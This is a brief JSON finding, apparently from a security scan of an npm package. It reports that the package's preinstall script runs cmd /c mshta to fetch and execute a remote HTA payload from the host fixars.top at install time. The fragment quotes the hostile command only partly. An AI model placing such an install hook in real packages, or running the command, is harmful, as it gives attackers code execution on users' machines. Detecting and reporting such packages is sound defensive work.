  "summary": "preinstall executes remote HTA payload via mshta from http://fixars.top",
  "details": "The package's preinstall.js lifecycle script runs `exec('cmd /c \"mshta http://fixars.top...\"')`, causing npm to fetch and execute attacker-controlled HTA/script content from the non-publisher, plain-HTTP host fixars.top during `npm install`. This yields arbitrary code execution on the installer's machine at install time, with no pinning, no integrity check, and no relation to any documented package function.",
